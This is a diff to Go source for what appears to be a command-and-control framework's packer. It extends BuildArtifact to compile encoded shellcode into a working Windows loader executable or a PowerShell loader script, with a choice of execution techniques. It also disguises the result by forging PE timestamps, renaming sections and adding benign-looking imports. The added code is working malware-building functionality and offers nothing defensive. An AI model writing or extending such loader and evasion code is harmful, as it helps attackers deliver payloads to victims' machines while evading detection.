@@ -35,6 +35,58 @@ func randomHex(n int) string {
 	return hex.EncodeToString(b)
 }
 
+// ArtifactValidationError marks a request-level problem (bad enum value,
+// malformed payload, unsupported combination). Handlers map it to HTTP 400;
+// every other error returned by BuildArtifact is a server-side build failure
+// (HTTP 500).
+type ArtifactValidationError struct {
+	Msg string
+}
+
+func (e *ArtifactValidationError) Error() string { return e.Msg }
+
+func artifactValidationError(format string, a ...any) error {
+	return &ArtifactValidationError{Msg: fmt.Sprintf(format, a...)}
+}
+
+// normalizeEntryPoint maps the operator-facing entry point names to the
+// loader's execution techniques. "thread" and "call" are aliases (threaded
+// execution); "tls" has no loader implementation and is rejected rather than
+// silently ignored.
+func normalizeEntryPoint(name string, fallback EntryPointTechnique) (string, error) {
+	v := EntryPointTechnique(name)
+	if v == "" {
+		v = fallback
+	}
+	switch v {
+	case EPDirect, "":
+		return "direct", nil
+	case EPCall, "thread":
+		return "thread", nil
+	case EPCallback:
+		return "callback", nil
+	case EPTLS:
+		return "", artifactValidationError("tls entry point is not implemented; choose direct, thread or callback")
+	default:
+		return "", artifactValidationError("unknown entry point technique %q", name)
+	}
+}
+
+// BuildArtifact produces a packer artifact from an encoded shellcode blob or
+// a raw PE image:
+//
+//   - exe (and the legacy service_exe alias) builds a real Windows loader
+//     executable: the encoded shellcode, decode key and entry technique are
+//     compiled in, and the compiled PE then gets the requested timestamp /
+//     section-name / benign-import transformations applied to the actual
+//     binary.
+//   - ps1 renders a PowerShell loader script that decodes and executes the
+//     embedded blob.
+//   - raw / shellcode return the encoded payload bytes as-is (a raw blob is
+//     the meaningful result of those output types).
+//   - dll is refused: a Go-built DLL needs a C toolchain (-buildmode=c-shared
+//     requires an external linker) which is not assumed to exist on the
+//     server; shipping a fake DLL-shaped file would silently fail at load.
 func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, error) {
 	tmpl := DefaultArtifactTemplate(req.TemplateName)
 
@@ -75,6 +127,19 @@ func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, er
 		tmpl.BenignImports = strings.Split(req.ImportDLLs, ",")
 	}
 
+	// Certificate signing is not implemented; offering it as an option and
+	// then producing an unsigned binary would be a silent fake.
+	switch tmpl.CertOption {
+	case "", CertNone:
+	default:
+		return nil, "", artifactValidationError("certificate option %q is not implemented; only \"none\" is supported", tmpl.CertOption)
+	}
+
+	entry, err := normalizeEntryPoint(req.EntryPoint, tmpl.EntryPointTechnique)
+	if err != nil {
+		return nil, "", err
+	}
+
 	tmpDir, err := os.MkdirTemp("", "forgec2-pack-*")
 	if err != nil {
 		return nil, "", fmt.Errorf("temp dir: %w", err)
@@ -82,50 +147,92 @@ func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, er
 	defer os.RemoveAll(tmpDir)
 
 	var payloadData []byte
+	var encKey []byte
 
 	if req.ShellcodeB64 != "" {
 		shellcode, err := base64.StdEncoding.DecodeString(req.ShellcodeB64)
 		if err != nil {
-			return nil, "", fmt.Errorf("shellcode base64: %w", err)
+			return nil, "", artifactValidationError("shellcode base64: %v", err)
 		}
-		var encKey []byte
+		if len(shellcode) == 0 {
+			return nil, "", artifactValidationError("shellcode is empty after base64 decode")
+		}
 		if req.EncodeKeyHex != "" {
 			encKey, err = hex.DecodeString(req.EncodeKeyHex)
 			if err != nil {
-				return nil, "", fmt.Errorf("invalid encode key hex: %w", err)
+				return nil, "", artifactValidationError("invalid encode key hex: %v", err)
 			}
 		}
-		if encKey == nil || len(encKey) == 0 {
+		if len(encKey) == 0 {
 			encKey = []byte(randomHex(8))
 		}
 		encoded, err := EncodeShellcode(shellcode, tmpl.ShellcodeEncode, encKey)
 		if err != nil {
-			return nil, "", fmt.Errorf("encode: %w", err)
+			return nil, "", artifactValidationError("encode: %v", err)
 		}
-		payloadData = encoded
+		if len(encoded) == 0 {
+			return nil, "", artifactValidationError("encoded shellcode is empty")
+		}
+
+		switch tmpl.OutputType {
+		case "exe", "service_exe":
+			// Build a real loader EXE with the encoded blob, key, decode
+			// method and entry technique compiled in.
+			payloadData, err = buildLoaderEXE(tmpDir, encoded, encKey, tmpl.ShellcodeEncode, entry)
+			if err != nil {
+				return nil, "", err
+			}
+		case "ps1":
+			payloadData, err = buildPS1Loader(encoded, encKey, tmpl.ShellcodeEncode)
+			if err != nil {
+				return nil, "", err
+			}
+		case "raw", "shellcode", "":
+			payloadData = encoded
+		case "dll":
+			return nil, "", artifactValidationError("dll output is not supported: Go DLL builds require a C toolchain (gcc) which is not available on this server")
+		default:
+			return nil, "", artifactValidationError("unknown output type %q", tmpl.OutputType)
+		}
 	} else if req.RawEXEB64 != "" {
+		// Raw PE passthrough: the artifact IS the supplied executable. The
+		// output type is ignored because nothing can be built from a PE other
+		// than the PE itself (packaging it differently belongs to the bundle
+		// endpoint).
 		payloadData, err = base64.StdEncoding.DecodeString(req.RawEXEB64)
 		if err != nil {
-			return nil, "", fmt.Errorf("exe base64: %w", err)
+			return nil, "", artifactValidationError("exe base64: %v", err)
 		}
+		if len(payloadData) < 0x40 || payloadData[0] != 'M' || payloadData[1] != 'Z' {
+			return nil, "", artifactValidationError("raw_exe_b64 does not decode to a PE image (missing MZ header)")
+		}
+		// Encode the shellcode field if it was also supplied: the request
+		// validator only requires one of the two, but an encode type with a
+		// raw exe is meaningless and would silently do nothing.
+		if req.EncodeType != "" && req.EncodeType != "none" {
+			return nil, "", artifactValidationError("encode_type %q cannot be applied to a raw exe", req.EncodeType)
+		}
+		tmpl.OutputType = "raw"
 	} else {
-		// The Go-loader build path is intentionally removed: its generated
-		// source hardcodes an empty shellcode blob, so the compiled artifact
-		// does nothing (getShellcode() returns nil and main() exits). Requiring
-		// an explicit payload source keeps BuildArtifact from silently emitting
-		// a non-functional binary.
-		return nil, "", fmt.Errorf("no payload source provided: set shellcode_b64 or raw_exe_b64 to build an artifact")
+		return nil, "", artifactValidationError("no payload source provided: set shellcode_b64 or raw_exe_b64 to build an artifact")
 	}
 
-	if len(payloadData) > 0 {
-		ts, _ := GenerateTimestamp(tmpl.Timestamp, tmpl.TimestampValue)
+	// PE transformations only make sense on a real PE image. They apply to the
+	// freshly compiled loader and to raw-exe passthroughs; encoded shellcode
+	// blobs are not PE images and must be skipped (ApplyTimestamp and
+	// ApplyPESectionNames would no-op, AddBenignImports would error).
+	if len(payloadData) >= 2 && payloadData[0] == 'M' && payloadData[1] == 'Z' {
+		ts, err := GenerateTimestamp(tmpl.Timestamp, tmpl.TimestampValue)
+		if err != nil {
+			return nil, "", artifactValidationError("%s", err)
+		}
 		ApplyTimestamp(payloadData, ts)
 		if tmpl.PESections != (PESectionConfig{}) {
 			ApplyPESectionNames(payloadData, tmpl.PESections)
 		}
 		if tmpl.ImportManipulation && len(tmpl.BenignImports) > 0 {
 			if err := AddBenignImports(payloadData, tmpl.BenignImports); err != nil {
-				return nil, "", err
+				return nil, "", artifactValidationError("%s", err)
 			}
 		}
 	}
@@ -134,8 +241,6 @@ func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, er
 	switch tmpl.OutputType {
 	case "exe", "service_exe":
 		ext = ".exe"
-	case "dll":
-		ext = ".dll"
 	case "ps1":
 		ext = ".ps1"
 	}
